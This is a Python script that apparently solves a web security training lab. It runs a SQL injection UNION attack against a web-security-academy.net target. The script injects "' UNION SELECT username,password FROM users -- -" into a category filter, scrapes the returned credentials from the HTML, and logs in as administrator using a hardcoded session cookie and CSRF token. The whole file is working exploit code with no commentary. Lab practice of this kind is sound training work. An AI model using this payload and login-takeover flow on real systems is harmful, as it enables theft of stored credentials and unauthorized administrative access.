# SQL injection UNION attack, retrieving data from other tables

import requests
import re

url = "https://0ab700d203e0febec0006634006f00dd.web-security-academy.net/"

PAYLOAD = "' UNION SELECT username,password FROM users -- -"

cookies = {
	"session": "QGfHhRmTSXi8DkL1MeBAYJsrurMedrBB"
}

params = {
	"category": PAYLOAD
}
session = requests.Session()

r = session.get(url + 'filter', params=params, cookies=cookies)
pwd = re.findall(r'<td>(.*)</td>', r.text)

data = {
	"csrf": "1avi87lBAoDjXWCz5YA1eCCQTK5uDPLu",
	"username": "administrator",
	"password": pwd[2]
}

r2 = session.post(url + 'login', data=data, cookies=cookies)
print(r2.status_code)
print(r2.text)